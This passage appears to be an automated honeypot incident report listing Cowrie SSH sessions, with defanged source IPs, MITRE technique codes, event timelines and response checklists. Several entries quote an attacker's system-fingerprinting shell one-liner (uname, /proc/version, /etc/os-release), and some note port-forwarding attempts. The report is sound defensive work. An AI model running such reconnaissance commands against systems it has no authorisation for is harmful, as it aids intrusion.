| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:25:42` | `cowrie.session.connect` |
| `2026-07-26 08:25:42` | `cowrie.client.version` |
| `2026-07-26 08:25:42` | `cowrie.client.kex` |
| `2026-07-26 08:25:44` | `cowrie.login.success` |
| `2026-07-26 08:25:45` | `cowrie.session.params` |
| `2026-07-26 08:25:45` | `cowrie.command.input` |
| `2026-07-26 08:25:45` | `cowrie.command.input` |
| `2026-07-26 08:25:45` | `cowrie.command.input` |
| `2026-07-26 08:25:45` | `cowrie.command.input` |
| `2026-07-26 08:25:45` | `cowrie.command.input` |
| `2026-07-26 08:25:45` | `cowrie.command.success` |
| `2026-07-26 08:25:45` | `cowrie.command.input` |
| `2026-07-26 08:25:45` | `cowrie.command.input` |
| `2026-07-26 08:25:45` | `cowrie.command.input` |
| `2026-07-26 08:25:45` | `cowrie.command.input` |
| `2026-07-26 08:25:46` | `cowrie.log.closed` |
| `2026-07-26 08:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-655a49883310

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:27 |
| **Last Seen** | 2026-07-26 08:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:27:24` | `cowrie.session.connect` |
| `2026-07-26 08:27:24` | `cowrie.client.version` |
| `2026-07-26 08:27:24` | `cowrie.client.kex` |
| `2026-07-26 08:27:26` | `cowrie.login.success` |
| `2026-07-26 08:27:27` | `cowrie.session.params` |
| `2026-07-26 08:27:27` | `cowrie.command.input` |
| `2026-07-26 08:27:27` | `cowrie.command.input` |
| `2026-07-26 08:27:27` | `cowrie.command.input` |
| `2026-07-26 08:27:27` | `cowrie.command.input` |
| `2026-07-26 08:27:27` | `cowrie.command.input` |
| `2026-07-26 08:27:27` | `cowrie.command.success` |
| `2026-07-26 08:27:27` | `cowrie.command.input` |
| `2026-07-26 08:27:27` | `cowrie.command.input` |
| `2026-07-26 08:27:27` | `cowrie.command.input` |
| `2026-07-26 08:27:27` | `cowrie.command.input` |
| `2026-07-26 08:27:28` | `cowrie.log.closed` |
| `2026-07-26 08:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fecc14dab241

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:29 |
| **Last Seen** | 2026-07-26 08:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:29:09` | `cowrie.session.connect` |
| `2026-07-26 08:29:09` | `cowrie.client.version` |
| `2026-07-26 08:29:09` | `cowrie.client.kex` |
| `2026-07-26 08:29:10` | `cowrie.login.success` |
| `2026-07-26 08:29:11` | `cowrie.session.params` |
| `2026-07-26 08:29:11` | `cowrie.command.input` |
| `2026-07-26 08:29:11` | `cowrie.command.input` |
| `2026-07-26 08:29:11` | `cowrie.command.input` |
| `2026-07-26 08:29:11` | `cowrie.command.input` |
| `2026-07-26 08:29:11` | `cowrie.command.input` |
| `2026-07-26 08:29:11` | `cowrie.command.success` |
| `2026-07-26 08:29:11` | `cowrie.command.input` |
| `2026-07-26 08:29:11` | `cowrie.command.input` |
| `2026-07-26 08:29:11` | `cowrie.command.input` |
| `2026-07-26 08:29:11` | `cowrie.command.input` |
| `2026-07-26 08:29:12` | `cowrie.log.closed` |
| `2026-07-26 08:29:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb9539b23363

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:30 |
| **Last Seen** | 2026-07-26 08:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:30:51` | `cowrie.session.connect` |
| `2026-07-26 08:30:51` | `cowrie.client.version` |
| `2026-07-26 08:30:51` | `cowrie.client.kex` |
| `2026-07-26 08:30:53` | `cowrie.login.success` |
| `2026-07-26 08:30:54` | `cowrie.session.params` |
| `2026-07-26 08:30:54` | `cowrie.command.input` |
| `2026-07-26 08:30:54` | `cowrie.command.input` |
| `2026-07-26 08:30:54` | `cowrie.command.input` |
| `2026-07-26 08:30:54` | `cowrie.command.input` |
| `2026-07-26 08:30:54` | `cowrie.command.input` |
| `2026-07-26 08:30:54` | `cowrie.command.success` |
| `2026-07-26 08:30:54` | `cowrie.command.input` |
| `2026-07-26 08:30:54` | `cowrie.command.input` |
| `2026-07-26 08:30:54` | `cowrie.command.input` |
| `2026-07-26 08:30:54` | `cowrie.command.input` |
| `2026-07-26 08:30:54` | `cowrie.log.closed` |
| `2026-07-26 08:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e681a11b3422

| Field | Detail |
|---|---|
| **Source IP** | `65.49.1[.]122` |
| **First Seen** | 2026-07-26 08:31 |
| **Last Seen** | 2026-07-26 08:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:31:16` | `cowrie.session.connect` |
| `2026-07-26 08:31:16` | `cowrie.login.success` |
| `2026-07-26 08:31:17` | `cowrie.session.params` |
| `2026-07-26 08:31:17` | `cowrie.command.input` |
| `2026-07-26 08:31:17` | `cowrie.command.input` |
| `2026-07-26 08:31:17` | `cowrie.command.failed` |
| `2026-07-26 08:31:17` | `cowrie.command.input` |
| `2026-07-26 08:31:17` | `cowrie.command.failed` |
| `2026-07-26 08:31:17` | `cowrie.command.input` |
| `2026-07-26 08:31:17` | `cowrie.log.closed` |
| `2026-07-26 08:31:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.49.1[.]122` to AbuseIPDB if not already reported
- [ ] Block `65.49.1[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa8ce8408cf3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:32 |
| **Last Seen** | 2026-07-26 08:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:32:33` | `cowrie.session.connect` |
| `2026-07-26 08:32:34` | `cowrie.client.version` |
| `2026-07-26 08:32:34` | `cowrie.client.kex` |
| `2026-07-26 08:32:35` | `cowrie.login.success` |
| `2026-07-26 08:32:36` | `cowrie.session.params` |
| `2026-07-26 08:32:36` | `cowrie.command.input` |
| `2026-07-26 08:32:36` | `cowrie.command.input` |
| `2026-07-26 08:32:36` | `cowrie.command.input` |
| `2026-07-26 08:32:36` | `cowrie.command.input` |
| `2026-07-26 08:32:36` | `cowrie.command.input` |
| `2026-07-26 08:32:36` | `cowrie.command.success` |
| `2026-07-26 08:32:36` | `cowrie.command.input` |
| `2026-07-26 08:32:36` | `cowrie.command.input` |
| `2026-07-26 08:32:36` | `cowrie.command.input` |
| `2026-07-26 08:32:36` | `cowrie.command.input` |
| `2026-07-26 08:32:37` | `cowrie.log.closed` |
| `2026-07-26 08:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd657c10b0f2

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-26 08:33 |
| **Last Seen** | 2026-07-26 08:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:33:22` | `cowrie.session.connect` |
| `2026-07-26 08:33:22` | `cowrie.client.version` |
| `2026-07-26 08:33:22` | `cowrie.client.kex` |
| `2026-07-26 08:33:23` | `cowrie.login.success` |
| `2026-07-26 08:33:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea477492e36e

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-26 08:33 |
| **Last Seen** | 2026-07-26 08:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:33:22` | `cowrie.session.connect` |
| `2026-07-26 08:33:22` | `cowrie.client.version` |
| `2026-07-26 08:33:22` | `cowrie.client.kex` |
| `2026-07-26 08:33:23` | `cowrie.login.success` |
| `2026-07-26 08:33:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-775471b17e99

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:34 |
| **Last Seen** | 2026-07-26 08:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:34:16` | `cowrie.session.connect` |
| `2026-07-26 08:34:16` | `cowrie.client.version` |
| `2026-07-26 08:34:16` | `cowrie.client.kex` |
| `2026-07-26 08:34:17` | `cowrie.login.success` |
| `2026-07-26 08:34:19` | `cowrie.session.params` |
| `2026-07-26 08:34:19` | `cowrie.command.input` |
| `2026-07-26 08:34:19` | `cowrie.command.input` |
| `2026-07-26 08:34:19` | `cowrie.command.input` |
| `2026-07-26 08:34:19` | `cowrie.command.input` |
| `2026-07-26 08:34:19` | `cowrie.command.input` |
| `2026-07-26 08:34:19` | `cowrie.command.success` |
| `2026-07-26 08:34:19` | `cowrie.command.input` |
| `2026-07-26 08:34:19` | `cowrie.command.input` |
| `2026-07-26 08:34:19` | `cowrie.command.input` |
| `2026-07-26 08:34:19` | `cowrie.command.input` |
| `2026-07-26 08:34:19` | `cowrie.log.closed` |
| `2026-07-26 08:34:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-144aaacb2abb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:35 |
| **Last Seen** | 2026-07-26 08:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:35:58` | `cowrie.session.connect` |
| `2026-07-26 08:35:58` | `cowrie.client.version` |
| `2026-07-26 08:35:58` | `cowrie.client.kex` |
| `2026-07-26 08:35:59` | `cowrie.login.success` |
| `2026-07-26 08:36:01` | `cowrie.session.params` |
| `2026-07-26 08:36:01` | `cowrie.command.input` |
| `2026-07-26 08:36:01` | `cowrie.command.input` |
| `2026-07-26 08:36:01` | `cowrie.command.input` |
| `2026-07-26 08:36:01` | `cowrie.command.input` |
| `2026-07-26 08:36:01` | `cowrie.command.input` |
| `2026-07-26 08:36:01` | `cowrie.command.success` |
| `2026-07-26 08:36:01` | `cowrie.command.input` |
| `2026-07-26 08:36:01` | `cowrie.command.input` |
| `2026-07-26 08:36:01` | `cowrie.command.input` |
| `2026-07-26 08:36:01` | `cowrie.command.input` |
| `2026-07-26 08:36:01` | `cowrie.log.closed` |
| `2026-07-26 08:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f9ff8b3f5c8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:37 |
| **Last Seen** | 2026-07-26 08:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:37:41` | `cowrie.session.connect` |
| `2026-07-26 08:37:41` | `cowrie.client.version` |
| `2026-07-26 08:37:41` | `cowrie.client.kex` |
| `2026-07-26 08:37:43` | `cowrie.login.success` |
| `2026-07-26 08:37:44` | `cowrie.session.params` |
| `2026-07-26 08:37:44` | `cowrie.command.input` |
| `2026-07-26 08:37:44` | `cowrie.command.input` |
| `2026-07-26 08:37:44` | `cowrie.command.input` |
| `2026-07-26 08:37:44` | `cowrie.command.input` |
| `2026-07-26 08:37:44` | `cowrie.command.input` |
| `2026-07-26 08:37:44` | `cowrie.command.success` |
| `2026-07-26 08:37:44` | `cowrie.command.input` |
| `2026-07-26 08:37:44` | `cowrie.command.input` |
| `2026-07-26 08:37:44` | `cowrie.command.input` |
| `2026-07-26 08:37:44` | `cowrie.command.input` |
| `2026-07-26 08:37:44` | `cowrie.log.closed` |
| `2026-07-26 08:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12f152332095

| Field | Detail |
|---|---|
| **Source IP** | `61.169.54[.]150` |
| **First Seen** | 2026-07-26 08:39 |
| **Last Seen** | 2026-07-26 08:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:39:17` | `cowrie.session.connect` |
| `2026-07-26 08:39:18` | `cowrie.client.version` |
| `2026-07-26 08:39:18` | `cowrie.client.kex` |
| `2026-07-26 08:39:21` | `cowrie.login.success` |
| `2026-07-26 08:39:22` | `cowrie.direct-tcpip.request` |
| `2026-07-26 08:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.169.54[.]150` to AbuseIPDB if not already reported
- [ ] Block `61.169.54[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcc81eae9223

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:39 |
| **Last Seen** | 2026-07-26 08:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:39:26` | `cowrie.session.connect` |
| `2026-07-26 08:39:27` | `cowrie.client.version` |
| `2026-07-26 08:39:27` | `cowrie.client.kex` |
| `2026-07-26 08:39:28` | `cowrie.login.success` |
| `2026-07-26 08:39:29` | `cowrie.session.params` |
| `2026-07-26 08:39:29` | `cowrie.command.input` |
| `2026-07-26 08:39:29` | `cowrie.command.input` |
| `2026-07-26 08:39:29` | `cowrie.command.input` |
| `2026-07-26 08:39:29` | `cowrie.command.input` |
| `2026-07-26 08:39:30` | `cowrie.command.input` |
| `2026-07-26 08:39:30` | `cowrie.command.success` |
| `2026-07-26 08:39:30` | `cowrie.command.input` |
| `2026-07-26 08:39:30` | `cowrie.command.input` |
| `2026-07-26 08:39:30` | `cowrie.command.input` |
| `2026-07-26 08:39:30` | `cowrie.command.input` |
| `2026-07-26 08:39:30` | `cowrie.log.closed` |
| `2026-07-26 08:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-022063855702

| Field | Detail |
|---|---|
| **Source IP** | `223.100.248[.]64` |
| **First Seen** | 2026-07-26 08:39 |
| **Last Seen** | 2026-07-26 08:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:39:27` | `cowrie.session.connect` |
| `2026-07-26 08:39:28` | `cowrie.client.version` |
| `2026-07-26 08:39:28` | `cowrie.client.kex` |
| `2026-07-26 08:39:31` | `cowrie.login.success` |
| `2026-07-26 08:39:31` | `cowrie.direct-tcpip.request` |
| `2026-07-26 08:39:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.100.248[.]64` to AbuseIPDB if not already reported
- [ ] Block `223.100.248[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25b5f60ef3d6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:41 |
| **Last Seen** | 2026-07-26 08:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:41:08` | `cowrie.session.connect` |
| `2026-07-26 08:41:08` | `cowrie.client.version` |
| `2026-07-26 08:41:09` | `cowrie.client.kex` |
| `2026-07-26 08:41:10` | `cowrie.login.success` |
| `2026-07-26 08:41:11` | `cowrie.session.params` |
| `2026-07-26 08:41:11` | `cowrie.command.input` |
| `2026-07-26 08:41:11` | `cowrie.command.input` |
| `2026-07-26 08:41:11` | `cowrie.command.input` |
| `2026-07-26 08:41:11` | `cowrie.command.input` |
| `2026-07-26 08:41:11` | `cowrie.command.input` |
| `2026-07-26 08:41:11` | `cowrie.command.success` |
| `2026-07-26 08:41:11` | `cowrie.command.input` |
| `2026-07-26 08:41:11` | `cowrie.command.input` |
| `2026-07-26 08:41:11` | `cowrie.command.input` |
| `2026-07-26 08:41:11` | `cowrie.command.input` |
| `2026-07-26 08:41:12` | `cowrie.log.closed` |
| `2026-07-26 08:41:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-371951872cde

| Field | Detail |
|---|---|
| **Source IP** | `211.247.127[.]250` |
| **First Seen** | 2026-07-26 08:42 |
| **Last Seen** | 2026-07-26 08:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:42:34` | `cowrie.session.connect` |
| `2026-07-26 08:42:35` | `cowrie.client.version` |
| `2026-07-26 08:42:35` | `cowrie.client.kex` |
| `2026-07-26 08:42:36` | `cowrie.login.success` |
